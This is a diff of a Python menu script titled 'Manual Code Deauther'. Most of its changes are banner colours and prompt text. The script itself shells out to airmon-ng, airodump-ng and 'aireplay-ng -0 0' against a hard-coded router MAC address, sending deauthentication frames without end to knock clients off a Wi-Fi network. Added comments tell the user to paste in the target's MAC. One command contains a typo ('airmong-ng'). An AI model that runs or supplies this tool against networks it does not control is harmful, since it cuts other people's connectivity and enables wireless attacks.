@@ -35,30 +35,30 @@ def menu():
     os.system("clear")
     time.sleep(3)
     print(f"""
-{blue}Please Choose Number Two First To Paste The {red}MAC Targeter
-{ash}Then Determine The Wifi Adapter Interface, For {red}Example: wlan0/wlan1
-{red}@@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@
-{red}@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@
-{red}@@!  @@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!       @@!  @@@
-{red}!@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!       !@!  @!@
-{red}@!@  !@!  @!!!:!    @!@!@!@!  @!@  !@!    @!!    @!@!@!@!  @!!!:!    @!@!!@!
-{red}!@!  !!!  !!!!!:    !!!@!!!!  !@!  !!!    !!!    !!!@!!!!  !!!!!:    !!@!@!
-{white}!!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  !!:       !!: :!!
-{white}:!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       :!:  !:!
-{white}:::: ::   :: ::::  ::   :::  ::::: ::     ::    ::   :::   :: ::::  ::   :::
-{white}:: :  :   : :: ::    :   : :   : :  :      :      :   : :  : :: ::    :   : :""")
+{ash}Please Choose Number Two First To Paste The {red}MAC Targeter
+{ash}Then Determine The Wifi Adapter Interface For {red}Example: wlan0/wlan1
+{ash}@@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@
+{ash}@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@
+{ash}@@!  @@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!       @@!  @@@
+{ash}!@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!       !@!  @!@
+{ash}@!@  !@!  @!!!:!    @!@!@!@!  @!@  !@!    @!!    @!@!@!@!  @!!!:!    @!@!!@!
+{ash}!@!  !!!  !!!!!:    !!!@!!!!  !@!  !!!    !!!    !!!@!!!!  !!!!!:    !!@!@!
+{red}!!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  !!:       !!: :!!
+{red}:!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       :!:  !:!
+{red}:::: ::   :: ::::   ::   :::  ::::: ::    :::    :::  :::  :: ::::   :::   :::
+{red}:: : :    :: ::::   ::   : :   : :: ::     :      :   : :  : :: ::   ::     :::""")
     print("")
     print(f"{red}******************************")
     print(f"{red}* [ Manual Code Deauther   ] *")
     print(f"{red}* [ Author : Deauther Test ] *")
     print(f"{red}* [ Deauther : 1           ] *")
-    print(f"{white}* [ Edit Deauther : 2      ] *")
-    print(f"{white}* [ Exit   : 0             ] *")
-    print(f"{white}******************************")
+    print(f"{red}* [ Edit Deauther : 2      ] *")
+    print(f"{red}* [ Exit   : 0             ] *")
+    print(f"{red}******************************")
     time.sleep(2)
 
 # Input Menu
-    tools = input(f"""{white}Input Number: """)
+    tools = input(f"""{red}Select Number ==>> """)
 
 # Output Menu
     if tools=="1":
@@ -71,8 +71,8 @@ def menu():
        os.system("airmon-ng stop wlan0")
        os.system("airmong-ng start wlan0")
        os.system("airodump-ng wlan0")
-       os.system("airodump-ng -c 1 --bssid E4:8D:8C:D7:C4:C6 wlan0")
-       os.system("aireplay-ng -0 0 -a E4:8D:8C:D7:C4:C6 wlan0")
+       os.system("airodump-ng -c 1 --bssid E4:8D:8C:D7:C4:C6 wlan0") # Paste Here Mac Target
+       os.system("aireplay-ng -0 0 -a E4:8D:8C:D7:C4:C6 wlan0") # Paste Here Mac Target
 
     elif tools=="2":
        os.system("clear")
